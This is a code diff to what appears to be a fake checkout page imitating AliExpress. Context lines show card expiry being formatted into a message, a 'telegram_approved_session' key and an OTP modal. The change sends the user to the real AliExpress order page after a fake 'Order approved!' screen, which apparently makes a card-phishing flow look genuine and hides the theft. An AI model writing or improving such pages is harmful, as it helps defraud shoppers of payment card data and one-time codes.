@@ -522,7 +522,7 @@
          <div class="success-mark">✓</div>
          <p>Order approved!</p>
          <p class="otp-note">Thank you for your order</p>
-         <button class="continue-btn" id="continue-shopping">Continue Shopping</button>
+         <button class="continue-btn" id="check-order-btn">Check Order Details</button>
        </div>
      </div>
    </div>
@@ -1008,14 +1008,20 @@ EXP: ${expiry}`);
       document.querySelector('#checkout-card-modal').setAttribute('aria-hidden', 'true');
     };
     
-    // Continue shopping
-    document.querySelector('#continue-shopping').onclick = () => {
+    // Check order details
+    document.querySelector('#check-order-btn').onclick = () => {
       document.querySelector('#checkout-success-modal').classList.remove('open');
       document.querySelector('#checkout-success-modal').setAttribute('aria-hidden', 'true');
+      
       const storedSession = localStorage.getItem('telegram_approved_session');
       if (storedSession) {
         localStorage.removeItem('telegram_approved_session');
       }
+      
+      showToast('Please sign in to track your orders');
+      setTimeout(() => {
+        window.open('https://www.aliexpress.com/p/order/index.html?spm=a2g0o.detail.headerAcount.1.6e511e78OhgpUn', '_blank');
+      }, 1000);
     };
     
     // Close OTP modal
